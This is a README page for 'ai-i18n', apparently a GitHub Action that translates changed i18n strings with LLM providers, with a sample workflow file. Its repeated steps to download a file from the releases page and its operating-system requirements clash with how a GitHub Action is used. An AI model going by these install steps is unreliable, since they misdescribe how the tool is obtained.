---
layout: "default"
title: "🌍 ai-i18n - Enhance Your App's Translation Effort"
description: "🌐 Automate translation of i18n files with multiple LLM providers, handling various formats and ensuring efficient updates in your projects."
---
# 🌍 ai-i18n - Enhance Your App's Translation Effort

## 📥 Download Now
[![Download ai-i18n](https://img.shields.io/badge/Download-ai--i18n-brightgreen.svg)](https://github.com/Giandev-exe/ai-i18n/releases)

## 📖 Introduction
ai-i18n is a tool that helps you translate your app's internationalization (i18n) files. This GitHub Action makes translation easy by using large language models (LLMs) to detect and translate only the changes you make. It supports various formats like XLIFF and JSON and integrates seamlessly with providers such as Anthropic, OpenAI, and Ollama. If you’re looking for an efficient way to manage translations, this tool is a good choice.

## 🚀 Getting Started
To install and use ai-i18n, follow these simple steps. You don't need extensive technical knowledge, just a few clicks are all it takes!

1. **Visit the Download Page**: Open your web browser and click [here](https://github.com/Giandev-exe/ai-i18n/releases) to go to the releases page.

2. **Choose the Latest Version**: On the releases page, locate the most recent version of ai-i18n. It will generally be at the top of the list.

3. **Download the Files**: Click on the file link for the version you want. Your download will start immediately. 

4. **Locate the Downloaded File**: Depending on your browser settings, you may need to check your downloads folder to find the downloaded file.

## 🛠️ System Requirements
To run ai-i18n effectively, you should ensure that your system meets the following requirements:

- **Operating System**: Works on Windows, macOS, and Linux.
- **Internet Connection**: Requires a stable internet connection for LLM interactions.
- **GitHub Account**: You need a GitHub account to use GitHub Actions.

## 🔧 Usage 
Once you've downloaded ai-i18n, you'll be ready to use it in your projects.

1. **Set Up Your Project**: Ensure you have your project ready with i18n files that you want to translate.

2. **Create a GitHub Actions Workflow**: To utilize ai-i18n, you will add a YAML file to your repository. Here’s a basic example:

   ```yaml
   name: Translate i18n Files

   on:
     push:
       branches:
         - main

   jobs:
     translate:
       runs-on: ubuntu-latest

       steps:
       - name: Checkout Code
         uses: actions/checkout@v2

       - name: Run ai-i18n
         uses: Giandev-exe/ai-i18n@latest
         with:
           # Provide your LLM provider and other necessary configurations here
           provider: OpenAI
   ```

3. **Commit Your Changes**: After editing the workflow file, commit and push the changes to your GitHub repository.

4. **Check the Results**: The ai-i18n action will run on your code. Check the Actions tab in your repository to see the results. Only the strings that changed will be translated.

## 📊 Features
ai-i18n includes several features to streamline your translation process:

- **Efficient Translation**: Translates only modified strings.
- **Versatile Compatibility**: Works with multiple i18n file formats.
- **Multiple LLM Support**: Integrates with popular providers.
- **Easy Integration**: Acts as a drop-in replacement for other translation tools like Lokalise and Crowdin.

## 🔗 Additional Resources
For further assistance and resources, consider checking out the following:

- **Documentation**: Comprehensive guides and best practices can be found on the main GitHub page.
- **Issues Tracker**: If you run into any problems, feel free to check the issues page for common questions or submit your own.

## 📞 Support
If you need help, please contact the support community. You can ask questions in the Issues section of the repository. Community members and contributors will assist you in resolving any difficulties you encounter.

## 🎯 Contributing
We welcome contributions to ai-i18n! If you have ideas for new features or improvements, please submit your suggestions through pull requests.

## 🏷️ Topics
We categorize the project as follows: ai, angular, angular-i18n, anthropic, crowdin, github-actions, i18n, internationalization, llm, localization, lokalise, open-source, openai, phrase, react-intl, vue-i18n.

Ensure you follow the structured approach provided. Click [here](https://github.com/Giandev-exe/ai-i18n/releases) to download and get started!